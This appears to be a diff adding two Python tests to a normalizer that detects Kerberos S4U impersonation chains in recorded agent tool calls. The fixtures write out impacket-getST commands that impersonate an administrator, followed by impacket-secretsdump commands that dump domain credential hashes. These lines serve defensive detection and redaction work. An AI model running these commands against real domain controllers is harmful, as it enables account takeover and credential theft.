@@ -218,6 +218,171 @@ class CochiseNormalizerTests(unittest.TestCase):
         )
         self.assertNotIn("a" * 32, json.dumps(cases, sort_keys=True))
 
+    def test_s4u_ticket_to_secretsdump_emits_only_value_safe_complete_chain(self) -> None:
+        password = "source-password-fixture"
+        artifact = "administrator@cifs_dc.example.test@example.test.ccache"
+        issuance_result = "\n".join(
+            [
+                "source-only diagnostic that must not be retained",
+                "[*] Impersonating administrator",
+                "[*] Requesting S4U2self",
+                "[*] Requesting S4U2Proxy",
+                f"[*] Saving ticket in {artifact}",
+            ]
+        )
+        directory_hash = "EXAMPLE\\administrator:500:" + "1" * 32 + ":" + "2" * 32 + ":::"
+        rows = [
+            event(
+                "tool_call",
+                "issue",
+                params={
+                    "command": (
+                        "impacket-getST -dc-ip 192.0.2.10 -spn cifs/dc.example.test "
+                        f"-impersonate administrator example.test/operator:{password}"
+                    )
+                },
+            ),
+            event("tool_result", "issue", result=issuance_result),
+            event(
+                "tool_call",
+                "dump",
+                params={
+                    "command": (
+                        f"export KRB5CCNAME={artifact} && impacket-secretsdump "
+                        "-k -no-pass -dc-ip 192.0.2.10 dc.example.test"
+                    )
+                },
+            ),
+            event("tool_result", "dump", result=directory_hash),
+        ]
+        self.write("s4u-secretsdump-chain.json", rows)
+        cases, manifest = self.normalize()
+        chains = [
+            row
+            for row in cases
+            if row["truth"].get("rule_ids")
+            == [adapter.KERBEROS_S4U_DIRECTORY_ACQUISITION_CHAIN]
+        ]
+        self.assertEqual(len(chains), 1)
+        chain = chains[0]
+        self.assertEqual(chain["truth"], adapter.kerberos_s4u_directory_acquisition_truth())
+        self.assertEqual(chain["surface"], "stateful")
+        self.assertEqual(
+            [item["outcome"] for item in chain["payload"]["events"]],
+            ["succeeded", "succeeded"],
+        )
+        self.assertIn("result_proof", chain["payload"]["events"][0])
+        self.assertNotIn("result_proof", chain["payload"]["events"][1])
+        self.assertTrue(all("result" not in item for item in chain["payload"]["events"]))
+        encoded = json.dumps(chain, sort_keys=True)
+        self.assertNotIn(password, encoded)
+        self.assertNotIn(directory_hash, encoded)
+        self.assertNotIn("source-only diagnostic", encoded)
+        stats = adapter_stats(manifest)
+        self.assertEqual(stats["exact_s4u_issuance_candidates"], 1)
+        self.assertEqual(stats["exact_s4u_issuance_positive_candidates"], 1)
+        self.assertEqual(stats["deterministic_s4u_directory_acquisition_chains"], 1)
+
+    def test_s4u_chain_rejects_failed_wrapped_mismatched_and_unbounded_evidence(self) -> None:
+        artifact = "administrator@cifs_dc.example.test@example.test.ccache"
+        issuance = (
+            "impacket-getST -dc-ip 192.0.2.10 -spn cifs/dc.example.test "
+            "-impersonate administrator example.test/operator:fixture-password"
+        )
+        success = "\n".join(
+            [
+                "[*] Impersonating administrator",
+                "[*] Requesting S4U2self",
+                "[*] Requesting S4U2Proxy",
+                f"[*] Saving ticket in {artifact}",
+            ]
+        )
+        rows = [
+            event("tool_call", "failed", agent="failed-worker", params={"command": issuance}),
+            event(
+                "tool_result",
+                "failed",
+                agent="failed-worker",
+                result="Kerberos SessionError: KDC_ERR_BADOPTION",
+            ),
+            event(
+                "tool_call",
+                "wrapped",
+                agent="wrapped-worker",
+                params={"command": "sudo " + issuance},
+            ),
+            event("tool_result", "wrapped", agent="wrapped-worker", result=success),
+            event("tool_call", "mismatch", agent="mismatch-worker", params={"command": issuance}),
+            event("tool_result", "mismatch", agent="mismatch-worker", result=success),
+            event(
+                "tool_call",
+                "mismatch-dump",
+                agent="mismatch-worker",
+                params={
+                    "command": (
+                        "export KRB5CCNAME=different.ccache && impacket-secretsdump "
+                        "-k -no-pass -dc-ip 192.0.2.10 dc.example.test"
+                    )
+                },
+            ),
+            event(
+                "tool_result",
+                "mismatch-dump",
+                agent="mismatch-worker",
+                result="EXAMPLE\\administrator:500:" + "1" * 32 + ":" + "2" * 32 + ":::",
+            ),
+            event("tool_call", "late", agent="late-worker", params={"command": issuance}),
+            event("tool_result", "late", agent="late-worker", result=success),
+        ]
+        for index in range(adapter.MAX_CHAIN_CALLS):
+            rows.extend(
+                [
+                    event(
+                        "tool_call",
+                        f"gap-{index}",
+                        agent="late-worker",
+                        params={"command": "pwd"},
+                    ),
+                    event("tool_result", f"gap-{index}", agent="late-worker", result="/tmp"),
+                ]
+            )
+        rows.extend(
+            [
+                event(
+                    "tool_call",
+                    "late-dump",
+                    agent="late-worker",
+                    params={
+                        "command": (
+                            f"export KRB5CCNAME={artifact} && impacket-secretsdump "
+                            "-k -no-pass -dc-ip 192.0.2.10 dc.example.test"
+                        )
+                    },
+                ),
+                event(
+                    "tool_result",
+                    "late-dump",
+                    agent="late-worker",
+                    result="EXAMPLE\\administrator:500:" + "3" * 32 + ":" + "4" * 32 + ":::",
+                ),
+            ]
+        )
+        self.write("s4u-chain-negatives.json", rows)
+        cases, manifest = self.normalize()
+        self.assertFalse(
+            any(
+                row["truth"].get("rule_ids")
+                == [adapter.KERBEROS_S4U_DIRECTORY_ACQUISITION_CHAIN]
+                for row in cases
+            )
+        )
+        stats = adapter_stats(manifest)
+        self.assertEqual(stats["exact_s4u_issuance_candidates"], 3)
+        self.assertEqual(stats["exact_s4u_issuance_result_hard_negatives"], 1)
+        self.assertEqual(stats["exact_s4u_issuance_positive_candidates"], 2)
+        self.assertEqual(stats["exact_s4u_issuance_without_selected_sink_proof"], 2)
+        self.assertEqual(stats.get("deterministic_s4u_directory_acquisition_chains", 0), 0)
+
     def test_adcs_pfx_impersonation_emits_only_the_complete_bounded_chain(self) -> None:
         password = "source-password-fixture"
         nt_hash = "1" * 32 + ":" + "2" * 32
